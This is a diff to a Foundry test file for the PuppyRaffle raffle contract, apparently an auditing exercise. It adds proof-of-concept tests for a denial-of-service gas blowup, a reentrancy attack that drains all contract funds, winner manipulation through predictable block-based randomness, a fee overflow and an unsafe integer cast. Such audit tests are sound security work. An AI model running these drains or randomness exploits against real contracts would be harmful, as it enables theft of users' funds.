@@ -4,9 +4,11 @@ pragma experimental ABIEncoderV2;
 
 import {Test, console} from "forge-std/Test.sol";
 import {PuppyRaffle} from "../src/PuppyRaffle.sol";
+import {ReentrancyAttack} from "./ReentrancyAttack.sol";
 
 contract PuppyRaffleTest is Test {
     PuppyRaffle puppyRaffle;
+    ReentrancyAttack reentrancyAttack;
     uint256 entranceFee = 1e18;
     address playerOne = address(1);
     address playerTwo = address(2);
@@ -16,16 +18,12 @@ contract PuppyRaffleTest is Test {
     uint256 duration = 1 days;
 
     function setUp() public {
-        puppyRaffle = new PuppyRaffle(
-            entranceFee,
-            feeAddress,
-            duration
-        );
+        puppyRaffle = new PuppyRaffle(entranceFee, feeAddress, duration);
     }
 
     //////////////////////
     /// EnterRaffle    ///
-    /////////////////////
+    //////////////////////
 
     function testCanEnterRaffle() public {
         address[] memory players = new address[](1);
@@ -212,5 +210,115 @@ contract PuppyRaffleTest is Test {
         puppyRaffle.selectWinner();
         puppyRaffle.withdrawFees();
         assertEq(address(feeAddress).balance, expectedPrizeAmount);
+    }
+
+    function test_denialOfService() public {
+        uint256 gasStartA = gasleft();
+        address[] memory players = new address[](1);
+        players[0] = playerOne;
+        // @segon Not needed prank here
+        puppyRaffle.enterRaffle{value: entranceFee}(players);
+        uint256 gasCostA = gasStartA - gasleft();
+
+        uint256 gasStartB = gasleft();
+        players[0] = playerTwo;
+        puppyRaffle.enterRaffle{value: entranceFee}(players);
+        uint256 gasCostB = gasStartB - gasleft();
+
+        uint256 gasStartC = gasleft();
+        players[0] = playerThree;
+        puppyRaffle.enterRaffle{value: entranceFee}(players);
+        uint256 gasCostC = gasStartC - gasleft();
+
+        uint256 gasStartD = gasleft();
+        players[0] = playerFour;
+        puppyRaffle.enterRaffle{value: entranceFee}(players);
+        uint256 gasCostD = gasStartD - gasleft();
+
+        for (uint256 i = 5; i < 100; i++) {
+            players[0] = address(i);
+            puppyRaffle.enterRaffle{value: entranceFee}(players);
+        }
+
+        uint256 gasStartX = gasleft();
+        players[0] = address(100);
+        puppyRaffle.enterRaffle{value: entranceFee}(players);
+        uint256 gasCostX = gasStartX - gasleft();
+
+        console.log("gasCostA is: %s", gasCostA);
+        console.log("gasCostB is: %s", gasCostB);
+        console.log("gasCostC is: %s", gasCostC);
+        console.log("gasCostD is: %s", gasCostD);
+        console.log("gasCostX is: %s", gasCostX);
+    }
+
+    function test_reentrancyRefund() public {
+        // player 1,2,3 Store in Ether, then attack contract deposit in Ether and Reentrancy attack and pick up the contract all Ether!
+        address[] memory players = new address[](3);
+        players[0] = playerOne;
+        players[1] = playerTwo;
+        players[2] = playerThree;
+        puppyRaffle.enterRaffle{value: entranceFee * players.length}(players);
+        assert(address(puppyRaffle).balance == 3 ether);
+
+        reentrancyAttack = new ReentrancyAttack(address(puppyRaffle));
+        address[] memory attack = new address[](1);
+        attack[0] = address(reentrancyAttack);
+        puppyRaffle.enterRaffle{value: entranceFee}(attack);
+        assert(address(puppyRaffle).balance == 4 ether);
+
+        reentrancyAttack.attack();
+        assert(address(puppyRaffle).balance == 0 ether);
+        assert(address(reentrancyAttack).balance == 4 ether);
+    }
+
+    function test_randomnessDueToPredictableWinner() public playersEntered {
+        address attacker = makeAddr("attacker");
+        address[] memory player = new address[](1);
+        player[0] = attacker;
+        puppyRaffle.enterRaffle{value: entranceFee}(player);
+        vm.warp(puppyRaffle.raffleStartTime() + puppyRaffle.raffleDuration() + 1);
+        vm.roll(block.number + 1);
+
+        uint256 i = 1;
+        while (true) {
+            // address[] memory players = puppyRaffle.players;
+            uint256 winnerIndex =
+                uint256(keccak256(abi.encodePacked(address(this), block.timestamp, block.difficulty))) % 5;
+            address winner = puppyRaffle.players(winnerIndex);
+            if (winner == attacker) {
+                break;
+            }
+            // if no change block.timestamp, result will not change, here we simulate the passage of time of reality and blockchain
+            vm.warp(puppyRaffle.raffleStartTime() + puppyRaffle.raffleDuration() + i);
+        }
+        puppyRaffle.selectWinner();
+        assert(puppyRaffle.previousWinner() == attacker);
+    }
+
+    function test_overflow() public playersEntered {
+        vm.warp(puppyRaffle.raffleStartTime() + puppyRaffle.raffleDuration() + 1);
+        vm.roll(block.number + 1);
+        puppyRaffle.selectWinner();
+        console.log("The first raffle has four players, and totalFees is", puppyRaffle.totalFees());
+
+        address[] memory players = new address[](89);
+        for (uint256 i = 0; i < 89; i++) {
+            players[i] = address(i + 1);
+        }
+        puppyRaffle.enterRaffle{value: puppyRaffle.entranceFee() * players.length}(players);
+        vm.warp(puppyRaffle.raffleStartTime() + puppyRaffle.raffleDuration() + 1);
+        vm.roll(block.number + 1);
+        puppyRaffle.selectWinner();
+        console.log("The second raffle has eighty-nine players, and totalFees is", puppyRaffle.totalFees());
+
+        vm.prank(puppyRaffle.feeAddress());
+        vm.expectRevert("PuppyRaffle: There are currently players active!");
+        puppyRaffle.withdrawFees();
+    }
+
+    function test_unsafeCast() public view {
+        uint256 fee = 20000000000000000000;
+        console.log("uint64(fee) = ", uint64(fee));
     }
 }
